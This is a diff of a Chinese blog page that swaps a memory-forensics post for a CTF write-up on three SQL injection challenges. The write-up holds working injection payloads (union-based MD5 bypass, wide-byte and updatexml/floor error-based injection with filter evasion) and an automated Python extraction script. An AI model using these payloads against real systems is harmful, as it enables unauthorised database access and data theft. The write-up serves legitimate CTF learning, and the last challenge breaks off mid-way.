@@ -6,45 +6,50 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://k1ng0fic3.github.io">
-  <title>内存取证 | 冰皇&#39;s blog</title>
+  <title>SQL注入三连 | 冰皇&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="内存取证练习以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。">
+  <meta name="description" content="SQL注入练习三连为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目感谢颖奇师傅博客的帮助。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内存取证">
-<meta property="og:url" content="https://k1ng0fic3.github.io/2020/03/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/index.html">
+<meta property="og:title" content="SQL注入三连">
+<meta property="og:url" content="https://k1ng0fic3.github.io/2020/05/01/SQL%E6%B3%A8%E5%85%A5%E4%B8%89%E8%BF%9E/index.html">
 <meta property="og:site_name" content="冰皇&#39;s blog">
-<meta property="og:description" content="内存取证练习以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。">
+<meta property="og:description" content="SQL注入练习三连为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目感谢颖奇师傅博客的帮助。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun1.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun2.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun3.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun4.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun5.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun6.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun7.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun8.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun9.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun10.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun11.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun12.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun13.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun14.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun15.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun16.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun17.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun18.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun19.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun20.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun21.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun22.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun23.png">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/neicun24.png">
-<meta property="article:published_time" content="2020-03-05T03:05:36.520Z">
-<meta property="article:modified_time" content="2020-03-05T03:04:06.825Z">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql1.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql2.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql3.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql4.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql5.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql6.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql7.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql8.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql9.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql10.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql11.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql12.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql13.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql14.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql15.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql16.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql17.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql18.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql19.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql20.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql21.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql22.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql23.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql24.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql25.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql26.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql27.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql28.png">
+<meta property="og:image" content="https://k1ng0fic3.github.io/images/sql29.png">
+<meta property="article:published_time" content="2020-05-01T10:15:19.450Z">
+<meta property="article:modified_time" content="2020-03-05T03:18:31.781Z">
 <meta property="article:author" content="冰皇">
 <meta property="article:tag" content="Web，宝可梦，取证">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://k1ng0fic3.github.io/images/neicun1.png">
+<meta name="twitter:image" content="https://k1ng0fic3.github.io/images/sql1.png">
   
     <link rel="alternative" href="/atom.xml" title="冰皇&#39;s blog" type="application/atom+xml">
   
@@ -190,107 +195,168 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-内存取证" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-SQL注入三连" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      内存取证
+      SQL注入三连
     </h1>
   
 
         
-        <a href="/2020/03/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" class="archive-article-date">
-  	<time datetime="2020-03-05T03:05:36.520Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-05</time>
+        <a href="/2020/05/01/SQL%E6%B3%A8%E5%85%A5%E4%B8%89%E8%BF%9E/" class="archive-article-date">
+  	<time datetime="2020-05-01T10:15:19.450Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="内存取证练习"><a href="#内存取证练习" class="headerlink" title="内存取证练习"></a>内存取证练习</h1><h5 id="以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。"><a href="#以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。" class="headerlink" title="以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。"></a>以OtterCTF题目为例，Volatility为辅，进行内存取证方面应用的模拟和练习。</h5><a id="more"></a>
-<p>题目文件下载链接：</p>
-<h5 id="https-pan-baidu-com-s-1QVCp4a45sFQUkrX-D4fvUw"><a href="#https-pan-baidu-com-s-1QVCp4a45sFQUkrX-D4fvUw" class="headerlink" title="https://pan.baidu.com/s/1QVCp4a45sFQUkrX-D4fvUw"></a><a href="https://pan.baidu.com/s/1QVCp4a45sFQUkrX-D4fvUw" target="_blank" rel="noopener">https://pan.baidu.com/s/1QVCp4a45sFQUkrX-D4fvUw</a></h5><p>做题之前简单介绍下<code>Volatility</code>这个工具——<br>一款开源的内存取证分析工具，Python编写，兼容各系统，可通过插件来拓展功能。Kali-Linux下集成了该工具，命令行中输入volatility来使用，功能可在源码或直接-h查看。</p>
-<p>附：关于如何给volatility添加组件。<br>【在Python源码<code>https://github.com/volatilityfoundation/</code>中，将目标文件（如：mimikatz. py）移入<code>volatility-master\volatility\plugins</code>目录下即可。】</p>
-<h5 id="1-9、"><a href="#1-9、" class="headerlink" title="1-9、"></a>1-9、</h5><blockquote>
-<p>1- What the password? 100<br>you got a sample of rick’s PC’s memory. can you get his user password? </p>
-</blockquote>
-<p>第一步，先查看imageinfo<br>之后Volatility会给出几个建议的Profile值，用以指定内存的系统信息来精确的“对症下药”。（通常需要爆破出正确的Profile）</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun1.png" alt="avatar"></p>
-<p>第二步，利用插件mimikatz拓展功能（mimikatz：一个法国人写的，用来抓Windows明文密码的工具。此处为插件<code>mimikatz.py</code>）获得password</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun2.png" alt="avatar"></p>
+        <h1 id="SQL注入练习三连"><a href="#SQL注入练习三连" class="headerlink" title="SQL注入练习三连"></a>SQL注入练习三连</h1><h5 id="为了躲肺炎，在XCTF平台中の安恒杯-新春祈福赛中，找到了三个比较好的SQL注入题目"><a href="#为了躲肺炎，在XCTF平台中の安恒杯-新春祈福赛中，找到了三个比较好的SQL注入题目" class="headerlink" title="为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目"></a>为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目</h5><p>感谢颖奇师傅<a href="https://www.gem-love.com" target="_blank" rel="noopener">博客</a>的帮助。</p>
+<a id="more"></a>
+<h3 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h3><p><img src="https://k1ng0fic3.github.io/images/sql1.png" alt="avatar"></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql2.png" alt="avatar"></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql3.png" alt="avatar"></p>
+<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><h4 id="0x00：Babysqli-v1-0"><a href="#0x00：Babysqli-v1-0" class="headerlink" title="0x00：Babysqli v1.0"></a>0x00：Babysqli v1.0</h4><p>这是一道MD5比较bypass的题。<br>先回忆一下关于万能密码的注入基本原理：<code>select * from user where name =a&#39; or 1=1</code>查询结果因为<code>or 1=1</code>永远为真。所以整条语句返回<code>True</code>证明查询成功，并可以实现成功登录。<br>跟这道题关系不是很大。<br>fuzz时随便测试账号密码，返回wrong pass，查看源代码。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql4.png" alt="avatar"></p>
+<p>发现有注释信息：<br><code>&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code></p>
+<p>base32解码得：<br><code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p>
+<p>base64解码得：<br><code>select * from user where username = &#39;$name&#39;</code><br>测试表明name可注，过滤了and和=</p>
+<p>测试列数：</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql5.png" alt="avatar"></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql6.png" alt="avatar"></p>
+<p>为三列，并且测试出用户名必须为admin，并且位于第二列。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql7.png" alt="avatar"></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql8.png" alt="avatar"></p>
+<p>猜测分别为ID，user，和passwd的功能。</p>
+<p>题目没有给出源码，盲猜大概逻辑如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$passwd = md5($_POST[<span class="string">'pw'</span>]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from user where username = '$name'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">"Wrong Pass"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将查询出来的passwd和输入的密码的md5值比较，相等则登录成功不相等则返回wrong pass</p>
+<p>解题思路是：既然name参数可注，我们可以构造sql语句使其查询为假，然后联合查询出一个比如<code>e5ff986d9dc5feb884fad249a4dee66d</code>(binghuang的md5)，然后密码输入<code>binghuang</code>，就会查询成功。</p>
+<p>但是binghuang的md5肯定不在数据库里，该如何select出来？<br>很简单，联合查询时，当查询的数据不存在的时候，就会构造一个虚拟的数据来。<br>测试过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;   <span class="comment">#创建一个数据库</span></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>                <span class="comment">#使用test数据库</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>( <span class="keyword">id</span> <span class="built_in">int</span>, username <span class="built_in">varchar</span>(<span class="number">20</span>), <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">20</span>) );  <span class="comment">#创建表</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;          <span class="comment">#从表中查询所有,发现什么都没有</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'0'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">0</span>,<span class="string">'admin'</span>,<span class="string">'123456'</span>;  <span class="comment">#发现从表中居然返回了数据,因此可绕过</span></span><br></pre></td></tr></table></figure>
+
+<p>关于过滤，and可以用大小写绕过，使查询错误时用不等于代替等于即可。<br>payload：</p>
 <blockquote>
-<p>2- General Info 75<br>Let’s start easy - whats the PC’s name and IP address?</p>
+<p>name=admin’ And 1&gt;2 union select ‘1’,’admin’,’e5ff986d9dc5feb884fad249a4dee66d&amp;pw=binghuang</p>
 </blockquote>
-<p>先说IP地址，直接netscan即可扫出：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun3.png" alt="avatar"></p>
-<p>得到：192.168.202.131<br>之后看注册表：(hivelist)</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun4.png" alt="avatar"></p>
-<p>然后去printkey</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun5.png" alt="avatar"></p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun6.png" alt="avatar"></p>
-<p>中间略，一层一层目录查看即可，最终：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun7.png" alt="avatar"></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql9.png" alt="avatar"></p>
+<h4 id="0x01：Babysqli-v2-0"><a href="#0x01：Babysqli-v2-0" class="headerlink" title="0x01：Babysqli v2.0"></a>0x01：Babysqli v2.0</h4><p>一开始发现输入admin和任何密码都会登录成功但是明显没有flag，说明登录成功的不是目标位置。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql10.png" alt="avatar"></p>
+<p>You can really dance~</p>
+<p>稍微联想一下就知道了，中文网站 → UTF8 → 宽字节注入，测试%df’发现报错，判断成功：</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql11.png" alt="avatar"></p>
+<p>解决方案大概有<code>updatexml()</code>报错注入、<code>floor()</code>报错注入、布尔盲注等等办法<br>题中过滤了union、select、where等关键字，双写就可以绕过。</p>
+<h5 id="updatexml-报错注入原理："><a href="#updatexml-报错注入原理：" class="headerlink" title="updatexml()报错注入原理："></a><code>updatexml()</code>报错注入原理：</h5><blockquote>
+<p>updatexml (XML_document, XPath_string, new_value);</p>
+</blockquote>
+<p><code>updatexml()</code>函数的第二个参数为<code>XPath_string</code>，但是我们将<code>concat()</code>作为第二个参数传给<code>updatexml()</code>函数时，<code>concat()</code>返回类型为字符串所以不满足<code>XPath_string</code>格式，返回<code>XPath syntax error</code>，进而爆出数据库信息。</p>
+<p>&lt;1&gt; 数据库名</p>
 <blockquote>
-<p>3-Play Time 50<br>Rick just loves to play some good old videogames. can you tell which game is he playing? What’s the IP address of the server?</p>
+<p>name=admin%df’ and updatexml(1,concat(1,database()),1) –+&amp;pw=123</p>
 </blockquote>
-<p>回去找netscan，在进程中发现：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun8.png" alt="avatar"></p>
-<p>LunarMS：（游戏实锤）</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun9.png" alt="avatar"></p>
-<p>故：LunarMS IP为：77.102.199.102</p>
+<p>得到数据库名为<code>web_sqli</code></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql12.png" alt="avatar"></p>
+<p>注意：一般的exp都是<code>concat()</code>拼接上一个字符’<code>~</code>‘，编码为<code>0x7e</code>，本题fuzz发现hex被过滤了，所以<code>concat()</code>里直接拼个1算了，本题中没有影响。<br>加’<code>~</code>‘是因为<code>updatexml()</code>会报错字母和特殊字符之后的内容，所以手工补上一个特殊字符’<code>~</code>‘</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql13.png" alt="avatar"></p>
+<p>&lt;2&gt; 表名</p>
 <blockquote>
-<p>4-Name Game 100<br>We know that the account was logged in to a channel called Lunar-3. what is the account name?</p>
+<p>name=admin%df’ and updatexml(1,concat(1, (sselectelect group_concat(table_name) from information_schema.tables whwhereere table_schema=database() limit 0,1)),1) –+&amp;pw=123</p>
 </blockquote>
-<p>这道题目很简单，既然说了Lunar-3，那就去找就是了，顺便看一下前后的五行。</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun10.png" alt="avatar"></p>
-<p>答案：0tt3r8r33z3</p>
+<p>得到f14g,user两个表。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql14.png" alt="avatar"></p>
+<p>&lt;3&gt; 列名</p>
 <blockquote>
-<p>5- Name Game 2 150<br>From a little research we found that the username of the logged on character is always after this signature: 0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} What’s rick’s character’s name? </p>
+<p>name=admin%df’ and updatexml(1,concat(1, (seselectlect group_concat(column_name) from information_schema.columns  wherwheree TABLE_SCHEMA=database() and TABLE_NAME=f14g)),1) –+&amp;pw=123</p>
 </blockquote>
-<p>再次回到netscan的界面，把那个游戏LunarMS.exe（pid=708那个）给dump下来，因为题目文件是vmem文件么，所以memdump就好了</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun11.png" alt="avatar"></p>
-<p>接下来就去找0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}这串东西，可以辨认出来的是：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun12.png" alt="avatar"></p>
-<p>d @ Z三个字符，然而尝试strings之后。。</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun13.png" alt="avatar"></p>
-<p>失败了，还是去查看hex，选择已知相邻最长的0x5a 0x0c 0x00吧：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun14.png" alt="avatar"></p>
-<p>得到：M0rtyL0L（可能还有更好的匹配搜索办法）</p>
+<p>注意：表名<code>f14g</code>需要编码后请求，否则会返回<code>Error: Unknown column &#39;f14g&#39; in &#39;where clause&#39;</code>错误。本题目ban掉了hex，但是可以用<code>char()</code>编码实现。<br>更正为：</p>
 <blockquote>
-<p>6- Silly Rick 100<br>Silly rick always forgets his email’s password, so he uses a Stored Password Services online to store his password. He always copy and paste the password so he will not get it wrong. whats rick’s email password?</p>
+<p>name=admin%df’ and updatexml(1,concat(1, (seselectlect group_concat(column_name) from information_schema.columns  wherwheree TABLE_SCHEMA=database() and TABLE_NAME=char(102,49,52,103))),1) –+&amp;pw=123</p>
 </blockquote>
-<p>直接去看剪切板（clipboard）：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun15.png" alt="avatar"></p>
-<p>M@il_Pr0vid0rs</p>
+<p>得到：</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql15.png" alt="avatar"></p>
+<p>附：其实如果没有想起来<code>char()</code>编码，不指定<code>f14g</code>直接<code>where table_schema=database()</code>查所有字段，得到的也是上图结果。</p>
+<p>图中的<code>b80bb7740288fda1f201890375a60c8f</code>是<code>id</code>的MD5值，试着查了一下，也都是数字。<br>那么盲猜表里有一个<code>flag</code>的列，<code>flag</code>的MD5值为<code>327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
+<p>&lt;4&gt; 字段</p>
 <blockquote>
-<p>7- Hide And Seek 100<br>The reason that we took rick’s PC memory dump is because there was a malware infection. Please find the malware process name (including the extension)<br>BEAWARE! There are only 3 attempts to get the right flag!</p>
+<p>name=admin%df’ and updatexml(1,concat(1, (seleselectct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 0,1),1),1) –+ &amp;pw=123</p>
 </blockquote>
-<p>去看进程树吧（pstree）：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun16.png" alt="avatar"></p>
-<p>出现了一个新的值–PPid，解释起来很简单：<br>先说Pid（Process ID）–程序被操作系统加载到内存成为进程后动态分配的资源。注意动态一词，Pid在每次重新加载程序的时候都是不同的。（一个Pid标识一个进程，所以它也是唯一的）<br>而PPid（Parent Process ID）–是程序的父进程ID。<br>然后，就可以看题了，需要找出恶意软件进程的名字。<br>…还是再举个例子稍微解释一下</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun17.png" alt="avatar"></p>
-<p>从进程树里随便截取了一段，首先看到init。<br>推测为第一个进程，跟着序列号走：336→396，396→492，注意到后面有两次变动，492→1428,和492→808的时候，序列1428，808的进程又作为父进程，产生了1428→3916和808→960。之后又回到了492的主干，一片和谐。<br>了解这个过程之后就可以做题了。最开始，第三个进程就出现了问题：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun18.png" alt="avatar"></p>
-<p>Pid比PPid还要小，而且序列变化明显的异常，估计不会错了。<br>然后分析这个前后进程吧，dlllist：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun19.png" alt="avatar"></p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun20.png" alt="avatar"></p>
-<p>锁定了，Temp目录下执行，恶意进程实锤：vmware-tray.exe</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql16.png" alt="avatar"></p>
+<p>对<code>VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr</code>解base64得：</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql17.png" alt="avatar"></p>
+<p>这xxd一看就是co某dance歌词，隐写的思维，直接往最后看。</p>
 <blockquote>
-<p>8- Path To Glory 150<br>How did the malware got to rick’s PC? It must be one of rick old illigal habits…</p>
+<p>name=admin%df’ and updatexml(1,concat(1, (seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1),1) –+ &amp;pw=123</p>
 </blockquote>
-<p>malware-恶意软件，不过并不知道怎么看出来，这个问题我们后面再讨论吧（先贴个网址在这儿：<a href="https://www.freebuf.com/articles/system/104899.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/104899.html</a> ），不过匹配Rick和exe肯定没有错，filescan之：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun21.png" alt="avatar"></p>
-<p>这个地方比较懵，不过根据推测，rwd：读取写入即时同步，于是dump出RWD—模式的文件来看看：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun22.png" alt="avatar"></p>
+<p>得到：<code>R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0</code>解base64发现结果不全</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql18.png" alt="avatar"></p>
+<p>出现这种问题的原因是<code>updatexml()</code>限制长度为32位，超过32位的被丢弃了，所以上面无论是歌词还是flag，base64都经常缺个尾巴。<br>解决方法是用<code>substr()</code>它可以指定从字符串的某个位置开始，返回自定义长度：</p>
 <blockquote>
-<p>9- Path To Glory 200<br>Continue the search after the the way that malware got in.</p>
+<p>name=admin%df’ and updatexml(1,concat(1, substr((seleselectct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)),1) –+ &amp;pw=123</p>
 </blockquote>
-<p>接着上面那个题的，找出恶意软件之后来分析它，这个很暴力，dump下Chrome的进程然后匹配即可（比较耗时）：</p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun23.png" alt="avatar"></p>
-<p><img src="https://k1ng0fic3.github.io/images/neicun24.png" alt="avatar"></p>
+<p><img src="https://k1ng0fic3.github.io/images/sql19.png" alt="avatar"></p>
+<p>得到<code>Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0=</code>，把它和<code>R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0</code>对比一下，整合得到<code>R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0=</code>解base64，完毕。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql20.png" alt="avatar"></p>
+<p>这个时候回想一下，是不是在f14g表中，也可以用这个办法查出flag列的信息呢，哈哈</p>
+<p>&lt;5&gt; 转载工具<br>看了下<em>Nepnep</em>师傅们的WP，给出了一个updatexml的自动化脚本，转发以宣传之。<br>作者Shana、7TNE7，<a href="http://www.qfrost.com/PWN/GXY_CTF_2019/" target="_blank" rel="noopener">原文链接</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://183.129.189.60:10006/search.php/search.php?name=admin%df' and updatexml(1,concat(unhex(60),( substr((selselectect group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g),&#123;&#125;,32)),unhex(60)),1)--+&amp;pw=123"</span></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line">regularFilterStr = <span class="string">r"Error: XPATH syntax error: '`(.+?)'"</span></span><br><span class="line">allBase64Str = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = url.format(num)</span><br><span class="line">    num = num+<span class="number">31</span></span><br><span class="line">    response = requests.get(payload)</span><br><span class="line">    html = response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'`'</span> <span class="keyword">in</span> re.findall(regularFilterStr,html)[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    allBase64Str += re.findall(regularFilterStr,html)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">lists = allBase64Str.split(<span class="string">','</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lists:</span><br><span class="line">     print(base64.b64decode(i))</span><br></pre></td></tr></table></figure>
+
+<h5 id="floor-报错注入原理："><a href="#floor-报错注入原理：" class="headerlink" title="floor()报错注入原理："></a><code>floor()</code>报错注入原理：</h5><p>已经废话太多了就不再啰嗦了，参考一下<a href="https://blog.csdn.net/qq_39101049/article/details/88839514" target="_blank" rel="noopener">这个链接</a>，照着打就行。<br>最终的payload：</p>
+<blockquote>
+<p>name=%df’and(seselectlect 1 from(sselectelect count(*),concat((sselectelect (sselectelect  concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)–+&amp;pw=123</p>
+</blockquote>
+<p><img src="https://k1ng0fic3.github.io/images/sql21.png" alt="avatar"></p>
+<h4 id="0x02：Babysqli-v3-0"><a href="#0x02：Babysqli-v3-0" class="headerlink" title="0x02：Babysqli v3.0"></a>0x02：Babysqli v3.0</h4><p>其实不是SQL注入，原意是phar反序列化的题，但是非预期很多而且非预期比较简单，还是从正常解开始。</p>
+<p>关于phar反序列化有一篇特别好的<a href="https://www.cnblogs.com/BOHB-yunying/p/11504051.html" target="_blank" rel="noopener">总结</a>，必须分享。</p>
+<p>首先弱口令或者字典爆破登录进平台（admin&amp;password）<br>然后跳转到了URL：<code>http://183.129.189.60:10009/home.php?file=upload</code>上</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql22.png" alt="avatar"></p>
+<p>这种情况就扫一下:共flag.php upload.php home.php index.php四个，直接访问flag.php无回显，也无法文件读取，其他文件会自动加上后缀<code>.fxxkyou!</code>且00截断无效。</p>
+<p><img src="https://k1ng0fic3.github.io/images/sql23.png" alt="avatar"></p>
